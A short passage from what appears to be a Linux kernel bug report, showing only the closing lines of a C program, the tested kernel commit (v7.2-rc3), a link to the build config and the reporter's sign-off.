+    return 0;
+}
+==================================================================
+
+Kernel commit: a13c140cc289c0b7b3770bce5b3ad42ab35074aa (v7.2-rc3)
+Config: https://gist.githubusercontent.com/dandb3/199109d95bd174cb8bd446ed01055861/raw/6889acdc95db08c35d7c5d3288e352da8edaa775/.config
+
+Thanks,
+Junwoong
 
